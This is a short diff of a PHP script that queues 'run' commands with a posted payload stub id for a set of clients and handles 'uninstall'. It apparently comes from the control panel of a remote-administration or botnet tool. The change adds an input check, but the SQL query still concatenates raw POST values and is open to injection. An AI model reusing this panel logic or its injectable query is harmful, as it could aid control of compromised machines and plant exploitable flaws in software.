@@ -16,8 +16,10 @@ $succesMessage = "Executed ". $command . " on clients: ";
 
 if($command == "run")
 {    
-    $stubid = $_POST['payload'];   
-    foreach ($clients as $key => $id) {
+    if(isset($_POST['payload']))
+    {
+        $stubid = $_POST['payload'];   
+        foreach ($clients as $key => $id) {
         $sql = "INSERT INTO command (Client_Id, Command, StubId) VALUES(" . $id . ", '".$command."', '".$stubid."') ON DUPLICATE KEY UPDATE Client_Id=$id, Command='$command', StubId=$stubid";
         $dbconn->exec($sql);
         $succesMessage.= $id . ",";
@@ -25,6 +27,11 @@ if($command == "run")
 
     $succesMessage = substr_replace($succesMessage, "", -1);
     $_SESSION['command-succes'] = $succesMessage;    
+    }
+    else
+    {
+        $_SESSION['command-error'] = true;
+    }
 }
 else if($command == "uninstall")
 {
@@ -37,6 +44,6 @@ else if($command == "uninstall")
 }
 
 header('location: /');
-    die();
+die();
 
 ?>
